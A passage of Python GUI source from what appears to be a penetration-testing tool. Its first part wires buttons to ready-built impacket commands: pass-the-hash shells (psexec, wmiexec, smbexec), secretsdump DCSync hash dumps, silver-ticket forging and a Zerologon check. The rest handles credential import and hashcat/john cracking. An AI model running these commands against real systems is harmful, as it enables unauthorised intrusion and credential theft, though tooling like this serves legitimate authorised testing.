                scroll, fg_color=COLORS["bg_secondary"],
                border_color=COLORS["border_dim"], border_width=1,
                corner_radius=3)
            rf.pack(fill="x", padx=6, pady=3)
            top = ctk.CTkFrame(rf, fg_color="transparent")
            top.pack(fill="x", padx=6, pady=(4, 0))
            # Preview of the command (read-only, cedes wheel).
            cmd_box = ctk.CTkTextbox(
                top, height=30, font=_mono(11),
                fg_color=COLORS["bg_card"],
                text_color=COLORS["text_bright"],
                border_color=COLORS["border_dim"], border_width=1,
                corner_radius=3, wrap="none")
            cmd_box.pack(side="left", fill="x", expand=True,
                          padx=(0, 6))
            cmd_box.insert("1.0", cmd)
            cmd_box.configure(state="disabled")
            cmd_box._hawk_bubble_wheel = True
            try:
                cmd_box._textbox._hawk_bubble_wheel = True
            except Exception:
                pass

            def _launch(c=cmd, t=xterm_title):
                _open_terminal(f"HAWK — {t}", c)
                try:
                    self.app.terminal.write(
                        f"  [+] {t} launched in xterm.", "success")
                except Exception:
                    pass

            def _copy(c=cmd):
                try:
                    from utils.clipboard import clipboard_copy
                    clipboard_copy(c)
                    self.app.terminal.write(
                        f"  [+] Copied: {c[:72]}"
                        f"{'…' if len(c) > 72 else ''}", "success")
                except Exception:
                    pass

            ctk.CTkButton(
                top, text="▶ RUN",
                width=70, height=26, font=_mono(10, True),
                fg_color=COLORS["bg_card"],
                hover_color=COLORS["bg_card_hover"],
                border_color=COLORS["border_green"], border_width=1,
                text_color=COLORS["text_green"], corner_radius=2,
                command=_launch
            ).pack(side="left", padx=2)
            ctk.CTkButton(
                top, text="📋",
                width=32, height=26, font=_mono(10),
                fg_color=COLORS["bg_card"],
                hover_color=COLORS["bg_card_hover"],
                border_color=COLORS["border_dim"], border_width=1,
                text_color=COLORS["text_dim"], corner_radius=2,
                command=_copy
            ).pack(side="left", padx=2)

            ctk.CTkLabel(
                rf, text=f"  {label}  —  {hint}",
                font=_mono(10), text_color=COLORS["text_muted"],
                anchor="w", wraplength=700, justify="left",
            ).pack(fill="x", padx=10, pady=(2, 6))

        # ── PASS-THE-HASH (auth as the machine via NTLM) ────────
        _section("PASS-THE-HASH  —  authenticate as this machine",
                 COLORS["text_cyan"])

        # Pre-quoted fragments shared by the impacket action rows.
        q_hashes = _q(hashes_arg)
        q_nthash = _q(hashes_arg.split(":")[-1])
        q_dom_user_target = _q(f"{target_domain}/{username}@{target}")
        machine_fqdn = f"{machine_name}.{target_domain}"
        q_cifs_spn = _q(f"CIFS/{machine_fqdn}")
        q_admin_target = _q(f"{target_domain}/Administrator@{machine_fqdn}")

        _action_row(
            "psexec",
            f"psexec {machine_name}@{target}",
            f"impacket-psexec -hashes {q_hashes} "
            f"{q_dom_user_target}; "
            "read -p 'ENTER to close...'",
            "SYSTEM shell via Service Control Manager.  Loud but "
            "reliable — creates a Windows service called RemComSvc.")

        _action_row(
            "wmiexec",
            f"wmiexec {machine_name}@{target}",
            f"impacket-wmiexec -hashes {q_hashes} "
            f"{q_dom_user_target}; "
            "read -p 'ENTER to close...'",
            "Stealthier alternative — uses WMI instead of SCM, "
            "no service created.  Output is semi-interactive.")

        _action_row(
            "smbexec",
            f"smbexec {machine_name}@{target}",
            f"impacket-smbexec -hashes {q_hashes} "
            f"{q_dom_user_target}; "
            "read -p 'ENTER to close...'",
            "Semi-interactive shell via SMB named pipes.  Middle "
            "ground — no service, but slightly less stealthy than "
            "WMI.")

        _action_row(
            "netexec check",
            f"nxc smb {target} (PtH check)",
            f"netexec smb {_q(target)} -u {_q(username)} "
            f"-H {q_nthash} "
            f"-d {_q(target_domain)}; "
            "read -p 'ENTER to close...'",
            "Quick PtH-works? check.  No shell, just tells you if "
            "the hash authenticates to SMB.  Do this FIRST before "
            "trying psexec/wmiexec.")

        # ── DCSYNC (if the target IS a DC) ─────────────────────
        _section("DCSYNC  —  dump ALL domain hashes (DC target only)",
                 COLORS["text_red"])

        _action_row(
            "secretsdump (full)",
            f"secretsdump {machine_name}@{target}",
            f"impacket-secretsdump -hashes {q_hashes} "
            f"{q_dom_user_target}; "
            "read -p 'ENTER to close...'",
            "Full SAM + LSA + DCSync dump.  If target is a DC, you "
            "get every domain user's NTLM hash including krbtgt "
            "(→ Golden Ticket).  If target is NOT a DC, you still "
            "get the local SAM + LSA secrets.")

        _action_row(
            "secretsdump -just-dc",
            f"secretsdump -just-dc {machine_name}@{target}",
            f"impacket-secretsdump -hashes {q_hashes} "
            f"-just-dc {q_dom_user_target}; "
            "read -p 'ENTER to close...'",
            "Faster — skips the local SAM/LSA dump and only "
            "replicates the domain database.  Use when you KNOW "
            "the target is a DC and you only care about domain "
            "credentials.")

        # ── SILVER TICKET (forge Kerberos service tickets) ─────
        _section("SILVER TICKET  —  forge Kerberos TGS as arbitrary "
                 "user",
                 COLORS["text_orange"])

        _action_row(
            "ticketer (template)",
            f"ticketer silver {machine_name}",
            f"impacket-ticketer -nthash "
            f"{q_nthash} "
            f"-domain-sid '<S-1-5-21-XXX-XXX-XXX>' "
            f"-domain {_q(target_domain)} "
            f"-spn {q_cifs_spn} "
            f"Administrator && "
            f"export KRB5CCNAME=Administrator.ccache && "
            f"impacket-psexec -k -no-pass "
            f"{q_admin_target}; "
            "read -p 'ENTER to close...'",
            "Forges a service ticket as Administrator for CIFS on "
            "this machine.  Needs the domain SID — get it from "
            "`impacket-lookupsid` or the DCSync output above.  "
            "Edit the SID placeholder before running.")

        # ── ZEROLOGON (CVE-2020-1472) ──────────────────────────
        _section("ZEROLOGON  —  CVE-2020-1472 check (unpatched DCs)",
                 COLORS["text_red"])

        _action_row(
            "zerologon check",
            f"zerologon-check {machine_name}",
            f"impacket-netview -d {_q(target_domain)} "
            f"-u {_q(username)} -hashes {q_hashes} "
            f"--computer {_q(machine_name)} {_q(target)} || "
            f"python3 -c \"print('Use a dedicated CVE-2020-1472 "
            f"tester — e.g. "
            f"github.com/SecuraBV/CVE-2020-1472')\"; "
            "read -p 'ENTER to close...'",
            "Zerologon sanity check.  For pre-2020 Windows Server "
            "(esp. 2008 R2 / 2012) that hasn't been patched this "
            "should still work — full exploit requires a dedicated "
            "tool (SecuraBV's PoC or mimikatz).")

        # ── Bottom ─────────────────────────────────────────────
        row = _btn_row(win)
        _btn(row, "CLOSE", lambda: _safe_destroy(win),
             primary=True, w=120)

    # ─── Add credential ───────────────────────────────────────────────────────

    def _add_manual(self):
        from gui.dialogs import _make_win, _safe_destroy, _btn_row, _btn
        win = _make_win(self, "Add Credential", 520, 480)
        ctk.CTkLabel(win, text="Add Credential",
            font=_mono(15, True), text_color=COLORS["text_bright"]
            ).pack(pady=(14,8))

        # ── Pin the button row to the bottom FIRST, so it is always visible
        # regardless of how many fields are shown in the body above.
        btn_bar = ctk.CTkFrame(win, fg_color="transparent", height=60)
        btn_bar.pack(side="bottom", fill="x", pady=(6, 10))
        btn_bar.pack_propagate(False)

        # Body contains everything else, filling the remaining space.
        body = ctk.CTkFrame(win, fg_color="transparent")
        body.pack(side="top", fill="both", expand=True)

        type_var = ctk.StringVar(value="cleartext")
        tr = ctk.CTkFrame(body, fg_color="transparent")
        tr.pack(pady=4)
        for val, label in [("cleartext","Cleartext password"),("hash","Hash / encrypted")]:
            ctk.CTkRadioButton(tr, text=label, variable=type_var, value=val,
                font=_mono(13), text_color=COLORS["text_dim"],
                fg_color=COLORS["border_green"], border_color=COLORS["border_dim"]
                ).pack(side="left", padx=16)

        # Username first (always shown)
        user_row = ctk.CTkFrame(body, fg_color="transparent")
        user_row.pack(fill="x", padx=24, pady=3)
        ctk.CTkLabel(user_row, text="Username:", font=_mono(13),
            text_color=COLORS["text_dim"], width=110, anchor="w").pack(side="left")
        user_e = ctk.CTkEntry(user_row, height=28, placeholder_text="e.g. administrator",
            font=_mono(13), fg_color=COLORS["bg_card"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_green"], border_width=1, corner_radius=3)
        user_e.pack(side="left", fill="x", expand=True)

        # Host row (always shown).  A credential without a host cannot
        # dedup against the same login harvested by an enumeration push
        # (the store keys dedup on user + host + secret), so a manual
        # entry used to sit next to its enum-push twin as a second row
        # (W-06).  Default to the current target so the common case
        # needs no typing.
        try:
            _cur_target = (self.app.target_bar.get_target() or "").strip()
        except Exception:
            _cur_target = ""
        host_row = ctk.CTkFrame(body, fg_color="transparent")
        host_row.pack(fill="x", padx=24, pady=3)
        ctk.CTkLabel(host_row, text="Host:", font=_mono(13),
            text_color=COLORS["text_dim"], width=110, anchor="w").pack(side="left")
        host_e = ctk.CTkEntry(host_row, height=28,
            placeholder_text="e.g. 10.10.10.10 (target)",
            font=_mono(13), fg_color=COLORS["bg_card"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_green"], border_width=1, corner_radius=3)
        host_e.pack(side="left", fill="x", expand=True)
        if _cur_target:
            host_e.insert(0, _cur_target)

        # Password row (cleartext mode only)
        pass_row = ctk.CTkFrame(body, fg_color="transparent")
        ctk.CTkLabel(pass_row, text="Password:", font=_mono(13),
            text_color=COLORS["text_dim"], width=110, anchor="w").pack(side="left")
        pass_e = ctk.CTkEntry(pass_row, height=28, placeholder_text="e.g. Password123",
            font=_mono(13), fg_color=COLORS["bg_card"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_green"], border_width=1, corner_radius=3)
        pass_e.pack(side="left", fill="x", expand=True)

        # Hash value row (hash mode only)
        hf = ctk.CTkFrame(body, fg_color="transparent")
        ctk.CTkLabel(hf, text="Hash value:", font=_mono(13),
            text_color=COLORS["text_dim"], width=110, anchor="w").pack(side="left")
        hash_e = ctk.CTkEntry(hf, height=28,
            placeholder_text="e.g. aad3b435...:e02bc503...",
            font=_mono(13), fg_color=COLORS["bg_card"],
            text_color=COLORS["text_yellow"],
            border_color=COLORS["border_amber"], border_width=1, corner_radius=3)
        hash_e.pack(side="left", fill="x", expand=True)

        # Hash type row (hash mode only)
        htf = ctk.CTkFrame(body, fg_color="transparent")
        ctk.CTkLabel(htf, text="Hash type:", font=_mono(13),
            text_color=COLORS["text_dim"], width=110, anchor="w").pack(side="left")
        ht_var = ctk.StringVar(value="Auto-detect")
        ctk.CTkOptionMenu(htf,
            values=["Auto-detect","NTLM","LM","MD5","SHA1","SHA256",
                    "SHA512","NTLMv2","bcrypt","md5crypt","sha512crypt"],
            variable=ht_var, width=200, height=28, font=_mono(13),
            fg_color=COLORS["bg_card"], button_color=COLORS["border_dim"],
            dropdown_fg_color=COLORS["bg_secondary"],
            dropdown_text_color=COLORS["text_bright"],
            text_color=COLORS["text_dim"], corner_radius=3
            ).pack(side="left", padx=8)

        # Services row (always shown, kept last so hash fields sit above it)
        svc_row = ctk.CTkFrame(body, fg_color="transparent")
        ctk.CTkLabel(svc_row, text="Services:", font=_mono(13),
            text_color=COLORS["text_dim"], width=110, anchor="w").pack(side="left")
        svc_e = ctk.CTkEntry(svc_row, height=28, placeholder_text="e.g. SSH,SMB",
            font=_mono(13), fg_color=COLORS["bg_card"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_green"], border_width=1, corner_radius=3)
        svc_e.pack(side="left", fill="x", expand=True)

        def _toggle(*_):
            # Remove all mode-dependent rows, then re-pack in correct order.
            for fr in (pass_row, hf, htf, svc_row):
                fr.pack_forget()
            is_hash = (type_var.get() == "hash")
            if is_hash:
                hf.pack(fill="x", padx=24, pady=3)
                htf.pack(fill="x", padx=24, pady=3)
            else:
                pass_row.pack(fill="x", padx=24, pady=3)
            # Services is always the last row in the body.
            svc_row.pack(fill="x", padx=24, pady=3)

        type_var.trace_add("write", _toggle)
        _toggle()  # initial layout (cleartext mode)

        def _save():
            u = user_e.get().strip()
            host = host_e.get().strip()
            s = [x.strip() for x in svc_e.get().split(",") if x.strip()]
            # Manual entries are operator input: nothing has
            # authenticated them yet.  They get promoted the moment a
            # CONNECT / brute parser proves the login.
            if type_var.get() == "cleartext":
                cred = Credential(username=u,
                    password=pass_e.get().strip(),
                    cred_type="cleartext", services=s,
                    source_phase="manual", host=host, verified=False)
            else:
                hv = hash_e.get().strip()
                # If the user pasted a FULL line (pwdump / shadow / user:hash)
                # into the hash field, split it and back-fill whichever
                # fields were left blank. This saves a class of bugs where
                # the cracked password later has no username to pair with.
                parsed_u, parsed_h, parsed_ht = split_username_hash(hv)
                if parsed_h and parsed_ht != "Unknown":
                    hv = parsed_h
                if parsed_u and not u:
                    u = parsed_u
                ht = ht_var.get()
                if ht == "Auto-detect":
                    ht = (parsed_ht if parsed_ht != "Unknown"
                          else detect_hash_type(hv))
                cred = Credential(username=u, hash_val=hv, hash_type=ht,
                    cred_type="hash", services=s,
                    source_phase="manual", host=host, verified=False)
            _safe_destroy(win)
            self.add_credential(cred)

        # Build the pinned button row inside btn_bar
        r = ctk.CTkFrame(btn_bar, fg_color="transparent")
        r.pack(expand=True)
        _btn(r, "ADD CREDENTIAL", _save, primary=True)
        _btn(r, "CANCEL", lambda: _safe_destroy(win))

    # ─── Import from clipboard ────────────────────────────────────────────────

    def _import_clipboard(self):
        """Credential import from clipboard — user-explicit paste only.

        SECURITY: previously the dialog auto-ran `self.clipboard_get()`
        on open and pre-populated the textbox with WHATEVER happened to
        be in the system clipboard.  That's a real data-exposure bug:
        if the user had just pasted an API key / password / personal
        data anywhere else (NVD setup dialog, password manager → form,
        ssh one-off, ...), HAWK would silently read and display it
        here.  User reported seeing their NIST API key surface in
        this dialog after pasting it into the NVD setup flow.

        Fix: NO automatic clipboard read.  The textbox opens empty.
        Users who actually want to paste hashdump output click the
        explicit PASTE button below."""
        from gui.dialogs import _make_win, _safe_destroy, _btn_row, _btn

        win = _make_win(self, "Import Credentials", 620, 520)
        ctk.CTkLabel(win, text="Import from Clipboard",
            font=_mono(15, True), text_color=COLORS["text_bright"]
            ).pack(pady=(14,6))

        # Explicit privacy notice so the user knows why we don't
        # auto-read the clipboard any more.
        _sec_frame = ctk.CTkFrame(
            win, fg_color=COLORS["bg_card"],
            border_color=COLORS["border_dim"],
            border_width=1, corner_radius=3)
        _sec_frame.pack(fill="x", padx=24, pady=(0, 8))
        ctk.CTkLabel(
            _sec_frame,
            text=("  🔒  HAWK no longer auto-pastes the clipboard into "
                  "this field.  Use the PASTE button below to paste "
                  "on-demand — prevents accidental exposure of API "
                  "keys / passwords you recently copied elsewhere."),
            font=_mono(11),
            text_color=COLORS["text_muted"],
            wraplength=560, justify="left", anchor="w",
        ).pack(fill="x", padx=8, pady=6)

        # Quick parse field
        qf = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
                          border_color=COLORS["border_green"],
                          border_width=1, corner_radius=4)
        qf.pack(fill="x", padx=24, pady=(0,8))
        ctk.CTkLabel(qf, text="  Quick Parse — paste one hashdump line:",
                     font=_mono(12, True), text_color=COLORS["text_green"],
                     anchor="w").pack(fill="x", padx=8, pady=(6,2))
        quick_var = ctk.StringVar(value="")
        qrow = ctk.CTkFrame(qf, fg_color="transparent")
        qrow.pack(fill="x", padx=8, pady=(0,6))
        qrow.grid_columnconfigure(0, weight=1)
        quick_entry = ctk.CTkEntry(qrow, textvariable=quick_var,
                                   placeholder_text="e.g. Administrator:500:aad3b435...:e02bc503:::",
                                   font=_mono(11), height=28,
                                   fg_color=COLORS["bg_secondary"],
                                   text_color=COLORS["text_bright"],
                                   border_color=COLORS["border_green"], border_width=1,
                                   corner_radius=3)
        quick_entry.grid(row=0, column=0, sticky="ew", padx=(0,4))

        def _quick_parse():
            line = quick_var.get().strip()
            if not line:
                return
            parts = [p for p in line.split(":") if p.strip()]
            if len(parts) >= 3:
                u = parts[0]
                ntlm = parts[-1]
                lm   = parts[-2]
                LM_EMPTY = "aad3b435b51404eeaad3b435b51404ee"
                hv = ntlm if lm.lower() == LM_EMPTY else f"{lm}:{ntlm}"
                ht = detect_hash_type(ntlm)
                # Add to textbox
                box_content = box.get("1.0", "end").strip()
                entry = f"{u}:{hv}"
                if box_content:
                    box.insert("end", f"\n{entry}")
                else:
                    box.delete("1.0", "end")
                    box.insert("1.0", entry)
                quick_var.set("")

        ctk.CTkButton(qrow, text="🔍 PARSE",
                      width=80, height=28, font=_mono(11, True),
                      fg_color=COLORS["bg_secondary"],
                      hover_color=COLORS["bg_card_hover"],
                      border_color=COLORS["border_green"], border_width=1,
                      text_color=COLORS["text_green"], corner_radius=3,
                      command=_quick_parse
                      ).grid(row=0, column=1, padx=(4,0))

        ctk.CTkLabel(win,
            text="Or paste multiple lines below (one per line):\n"
                 "  username:password  /  username:NTLM  /  username:LM:NTLM",
            font=_mono(12), text_color=COLORS["text_dim"],
            justify="left", anchor="w").pack(fill="x", padx=24, pady=(0,4))

        # Paste button + textbox on the same row.  The textbox OPENS
        # EMPTY — the user clicks PASTE when they want clipboard
        # content injected.  Explicit > automatic.
        box_row = ctk.CTkFrame(win, fg_color="transparent")
        box_row.pack(fill="x", padx=24, pady=(4, 0))

        def _paste_from_clipboard():
            try:
                clip = self.clipboard_get()
            except Exception:
                clip = ""
            if not clip:
                return
            # Replace any existing content with the fresh clipboard
            # value.  We don't append to avoid mixing paste-contexts.
            box.delete("1.0", "end")
            box.insert("1.0", clip)

        ctk.CTkButton(
            box_row, text="📋  PASTE",
            width=100, height=28,
            font=_mono(11, True),
            fg_color=COLORS["bg_card"],
            hover_color=COLORS["bg_card_hover"],
            border_color=COLORS["border_green"], border_width=1,
            text_color=COLORS["text_green"], corner_radius=3,
            command=_paste_from_clipboard,
        ).pack(side="left")
        ctk.CTkLabel(
            box_row,
            text="  — click to paste clipboard content here",
            font=_mono(10), text_color=COLORS["text_muted"],
            anchor="w",
        ).pack(side="left", padx=(6, 0))

        box = ctk.CTkTextbox(win, height=100, font=_mono(12),
            fg_color=COLORS["bg_card"], text_color=COLORS["text_bright"],
            border_color=COLORS["border_green"], border_width=1, corner_radius=3)
        box.pack(fill="x", padx=24, pady=(6, 8))
        # No auto-populate — see SECURITY comment in method docstring.

        svc_var = ctk.StringVar(value="SMB")
        sf = ctk.CTkFrame(win, fg_color="transparent")
        sf.pack(fill="x", padx=24, pady=4)
        ctk.CTkLabel(sf, text="Services:", font=_mono(13),
            text_color=COLORS["text_dim"], width=90, anchor="w").pack(side="left")
        ctk.CTkEntry(sf, textvariable=svc_var, height=28,
            font=_mono(13), fg_color=COLORS["bg_card"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_dim"], border_width=1,
            corner_radius=3).pack(side="left", fill="x", expand=True)

        def _do_import():
            text = box.get("1.0", "end").strip()
            svcs = [x.strip() for x in svc_var.get().split(",") if x.strip()]
            count = 0
            for line in text.splitlines():
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                # Single source of truth for parsing — handles pwdump,
                # Linux shadow, user:hash, user:cleartext, and bare hashes.
                u, v, ht = split_username_hash(line)
                if not v:
                    continue
                # Pasted text proves nothing: a secretsdump block is
                # fifty hashes nobody has authenticated with.
                if ht != "Unknown":
                    cred = Credential(
                        username=u or "", hash_val=v, hash_type=ht,
                        cred_type="hash", services=svcs,
                        source_phase="import", verified=False)
                elif u:
                    # user:<non-hash> → treat as cleartext credential
                    cred = Credential(
                        username=u, password=v,
                        cred_type="cleartext", services=svcs,
                        source_phase="import", verified=False)
                else:
                    # Unknown single token — skip (nothing to do with it)
                    continue
                self.add_credential(cred)
                count += 1
            _safe_destroy(win)
            self.app.terminal.write(
                f"  [+] Imported {count} credential(s).", "success")

        r = _btn_row(win)
        _btn(r, "IMPORT", _do_import, primary=True, w=120)
        _btn(r, "CANCEL", lambda: _safe_destroy(win))

    # ─── Crack dialog ─────────────────────────────────────────────────────────

    def _show_crack_dialog(self, cred):
        from gui.dialogs import _make_win, _safe_destroy, _btn_row, _btn, _note_box
        from utils.runner import _open_terminal

        # Gate: HAWK enforces one crack at a time (see _active_cracks
        # docstring).  If THIS credential is already cracking, the row
        # shows STOP instead of CRACK so we shouldn't get here; but if
        # ANOTHER credential is cracking, refuse and tell the user why.
        if self._has_active_crack() and cred.id not in self._active_cracks:
            self._show_one_at_a_time_notice()
            return

        raw_hash = cred.hash_val or ""
        ht = cred.hash_type or detect_hash_type(raw_hash)

        # Heal legacy / manually-entered credentials whose hash_val still
        # carries a username prefix (e.g. "Administrator:500:aad..:e02..:::").
        # Without this, john would choke on the embedded username and the
        # cracked password would never get paired back to the user.
        parsed_u, parsed_h, parsed_ht = split_username_hash(raw_hash)
        if parsed_u and parsed_h and parsed_ht != "Unknown":
            # Only rewrite if the hash actually changed (i.e. there was a
            # username prefix to strip) OR the credential was missing a
            # username. Otherwise leave it alone.
            if (parsed_h != raw_hash) or not (cred.username or "").strip():
                sess = self.app.session_manager.current
                cd = sess.get_credential_by_id(cred.id) if sess else None
                if cd is not None:
                    cd["username"]  = cred.username or parsed_u
                    cd["hash_val"]  = parsed_h
                    cd["hash_type"] = parsed_ht
                    try:
                        sess._touch()
                        sess.save()
                    except Exception:
                        pass
                cred.username  = cred.username or parsed_u
                cred.hash_val  = parsed_h
                cred.hash_type = parsed_ht
                raw_hash = parsed_h
                ht       = parsed_ht
                self.refresh()
                self.app.terminal.write(
                    f"  [*] Normalised credential: username='{cred.username}',"
                    f" hash_type={ht}", "dim")

        # NEW FLOW (replaces the old xterm-launcher dialog): open the
        # strategy picker which surfaces FAST / RULE-BASED / HYBRID /
        # TARGET / MASK / FULL STACK / CRACK ONLINE.  The old john +
        # hashcat radio dialog is gone — every strategy now uses the
        # new CrackRunner which handles CPU-OpenCL fallback, potfile
        # hygiene and result harvesting uniformly.  Legacy heal logic
        # above (username/hash normalisation) is preserved because
        # it's still useful for manual imports.
        from gui.dialogs import (
            show_crack_strategy_dialog, show_target_profile_dialog,
            show_online_crack_dialog, show_api_key_prompt,
            show_crack_progress_dialog)

        # For LM:NTLM composite hashes, use the NTLM half for cracking
        # (john/hashcat both work on bare NT).
        ntlm_only = extract_ntlm(raw_hash)
        hash_for_crack = (ntlm_only
                          if (ht == "NTLM" and ntlm_only != raw_hash)
                          else raw_hash)

        def _on_strategy(strategy, strategy_ctx):
            """Dispatch based on the user's strategy choice."""
            if strategy == "CRACK ONLINE":
                def _api_chosen(service_id):
                    self._start_online_api_crack(
                        cred, hash_for_crack, ht, service_id)
                def _browser_chosen(service_id):
                    self._start_online_browser_crack(
                        hash_for_crack, service_id)
                show_online_crack_dialog(
                    self, self.app, cred,
                    on_api_chosen=_api_chosen,
                    on_browser_chosen=_browser_chosen)
                return

            if strategy == "TARGET":
                def _dict_built(dict_path, n_lines):
                    self._start_local_crack(
                        cred, hash_for_crack, ht,
                        "TARGET", dict_path=dict_path)
                show_target_profile_dialog(
                    self, self.app, cred,
                    on_dict_built=_dict_built)
                return

            if strategy == "MASK":
                self._prompt_mask_and_run(
                    cred, hash_for_crack, ht)
                return

            # FAST / RULE-BASED / HYBRID / FULL STACK → run now.
            self._start_local_crack(
                cred, hash_for_crack, ht, strategy)

        # cred_idx here is an opaque passthrough the dialog only echoes
        # back; the credential is now tracked by its stable id, so hand
        # that over instead of a fragile list position.
        show_crack_strategy_dialog(
            self, self.app, cred, cred.id, _on_strategy)

    # ─── Strategy launchers (one per family) ──────────────────────────
    def _start_local_crack(self, cred, hash_str, hash_type,
                            strategy, dict_path=None):
        """FAST / RULE-BASED / HYBRID / TARGET / FULL STACK go through
        CrackRunner.  Opens the progress dialog, streams output, updates
        the credential on done."""
        from utils.crack_runner import CrackRunner
        from gui.dialogs import show_crack_progress_dialog

        runner = CrackRunner(
            output_callback=None,  # set below
            done_callback=None,
            ui_dispatcher=getattr(self.app, "ui_call", None))

        progress = show_crack_progress_dialog(
            self, self.app, strategy,
            on_stop=lambda: runner.kill())

        def _on_output(line, name, level):
            try:
                progress.append_line(line)
            except Exception:
                pass

        def _on_done(strategy_name, rc, cracked):
            # Registry cleanup — always, regardless of outcome.  Must
            # happen BEFORE refresh() so the row paints back to CRACK.
            self._unregister_crack(cred.id)
            if cracked:
                # Persist via session.mark_cracked_by_id — addresses the
                # credential by its stable id, so a delete that shifted
                # the list mid-crack can't misfile the result onto a
                # different row (and a False return means it was deleted).
                try:
                    sess = self.app.session_manager.current
                    if sess is not None:
                        sess.mark_cracked_by_id(cred.id, cracked)
                except Exception as e:
                    print(f"[hawk] mark_cracked failed: {e}")
                cred.cracked = True
                cred.cracked_pass = cracked
                self.refresh()
                self.app.terminal.write(
                    f"  [+] {strategy_name} CRACKED — "
                    f"{cred.username}:{cracked}", "success")
                try:
                    progress.close_success(
                        f"✓ cracked: {cracked}")
                except Exception:
                    pass
            else:
                self.app.terminal.write(
                    f"  [-] {strategy_name} exhausted without a hit.",
                    "warn")
                try:
                    progress.close_failure(
                        f"no hit — try a different strategy")
                except Exception:
                    pass

        runner.output_callback = _on_output
        runner.done_callback = _on_done

        # Register BEFORE dispatching the run: the runner spawns its
        # subprocess from a worker thread, so by the time it returns
        # the row should already be showing STOP.
        self._register_crack(cred.id, runner, strategy)

        # Dispatch to the right runner method.
        if strategy == "FAST":
            runner.run_fast(hash_str, hash_type)
        elif strategy == "RULE-BASED":
            runner.run_rule_based(hash_str, hash_type, rule="best64")
        elif strategy == "HYBRID":
            runner.run_hybrid(hash_str, hash_type, mask="?d?d?s")
        elif strategy == "TARGET":
            runner.run_target(hash_str, hash_type, dict_path)
        elif strategy == "FULL STACK":
            runner.run_full_stack(hash_str, hash_type,
                                    target_dict_path=dict_path)
        else:
            self.app.terminal.write(
                f"  [!] Unknown strategy: {strategy}", "error")
            # Unknown strategy path never spawned — clear the
            # registration we just set.
            self._unregister_crack(cred.id)

    def _prompt_mask_and_run(self, cred, hash_str, hash_type):
        """Small pop-up asking for the mask string, then runs the
        MASK strategy."""
        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                  _btn_row, _btn, _safe_destroy)
        # Not a module-level import: this widget never imported it, so
        # the MASK dialog died with NameError halfway through building
        # itself.
        from utils.clipboard import add_context_menu

        win = _make_win(self, "MASK — pick a pattern", 620, 420)
        _title(win, "⛏  MASK attack — pattern")
        _sub(win,
             "Hashcat -a 3 with a fixed-length structural mask.",
             COLORS["text_dim"])

        _note_box(
            win,
            "Mask tokens:\n"
            "  ?l  lowercase  ?u  uppercase  ?d  digit\n"
            "  ?s  symbol     ?a  all (=?l?u?d?s)\n\n"
            "Common pattern for enforced-complexity AD passwords:\n"
            "  ?u?l?l?l?l?l?d?d?s   (Xxxxxx12!)\n"
            "  ?u?l?l?l?d?d?s       (Xxxx12!)\n"
            "\nLonger masks = exponential cost — stay ≤ 8 chars on CPU.",
            COLORS["border_dim"])

        mask_var = ctk.StringVar(value="?u?l?l?l?l?l?d?d?s")
        entry_fr = ctk.CTkFrame(win, fg_color="transparent")
        entry_fr.pack(fill="x", padx=24, pady=(6, 2))
        ctk.CTkLabel(
            entry_fr, text="Mask:", width=60, anchor="w",
            font=_mono(12), text_color=COLORS["text_bright"]
        ).pack(side="left")
        e = ctk.CTkEntry(
            entry_fr, textvariable=mask_var, font=_mono(13),
            height=32, fg_color=COLORS["bg_card"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_green"], border_width=1,
            corner_radius=3)
        e.pack(side="left", fill="x", expand=True)
        add_context_menu(e)

        def _go():
            mask = (mask_var.get() or "").strip()
            if not mask:
                return
            _safe_destroy(win)
            from utils.crack_runner import CrackRunner
            from gui.dialogs import show_crack_progress_dialog

            runner = CrackRunner(
                ui_dispatcher=getattr(self.app, "ui_call", None))
            progress = show_crack_progress_dialog(
                self, self.app, "MASK",
                on_stop=lambda: runner.kill())

            def _on_output(line, name, level):
                try:
                    progress.append_line(line)
                except Exception:
                    pass

            def _on_done(strategy_name, rc, cracked):
                # Always clear the active-crack registry first.
                self._unregister_crack(cred.id)
                if cracked:
                    try:
                        sess = self.app.session_manager.current
                        if sess is not None:
                            sess.mark_cracked_by_id(cred.id, cracked)
                    except Exception as e:
                        print(f"[hawk] mark_cracked failed: {e}")
                    cred.cracked = True
                    cred.cracked_pass = cracked
                    self.refresh()
                    self.app.terminal.write(
                        f"  [+] MASK CRACKED — "
                        f"{cred.username}:{cracked}", "success")
                    try:
                        progress.close_success(
                            f"✓ cracked: {cracked}")
                    except Exception:
                        pass
                else:
                    self.app.terminal.write(
                        "  [-] MASK exhausted without a hit.", "warn")
                    try:
                        progress.close_failure(
                            "no hit — try a different mask")
                    except Exception:
                        pass

            runner.output_callback = _on_output
            runner.done_callback = _on_done
            # Register BEFORE starting — same rationale as in
            # _start_local_crack: thread spawns fast and the row needs
            # to show STOP by the time the user's eyes return to it.
            self._register_crack(cred.id, runner, "MASK")
            runner.run_mask(hash_str, hash_type, mask)

        row = _btn_row(win)
        _btn(row, "RUN MASK", _go, primary=True, w=140)
        _btn(row, "CANCEL", lambda: _safe_destroy(win), w=120)

    def _start_online_api_crack(self, cred, hash_str,
                                  hash_type, service_id):
        """API-based online crack (hashes.com today).  Looks up the
        key, prompts lazily if missing, fires a HashesComJob."""
        from utils.online_crack import HashesComJob
        from gui.dialogs import show_api_key_prompt

        # Fetch or prompt for key.
        store = getattr(self.app, "_online_crack_keys", None)
        if store is None:
            store = {}
            self.app._online_crack_keys = store

        # Also try session-persisted keys (if the user ticked the box
        # earlier, the key rides along with the session JSON).
        if service_id not in store:
            try:
                sess = self.app.session_manager.current
                if sess is not None:
                    keys = getattr(sess, "_online_crack_keys", None)
                    if isinstance(keys, dict) \
                            and keys.get(service_id):
                        store[service_id] = keys[service_id]
            except Exception:
                pass

        def _with_key(api_key):
            self.app.terminal.section(
                f"CRACK ONLINE  ·  {service_id}  ·  {cred.username}")
            self.app.terminal.write(
                f"  $ submitting {hash_type} hash to {service_id} API",
                "cmd")

            def _on_status(msg):
                self.app.terminal.write(msg, "info")

            def _on_found(cracked):
                try:
                    sess = self.app.session_manager.current
                    if sess is not None:
                        sess.mark_cracked_by_id(cred.id, cracked)
                except Exception as e:
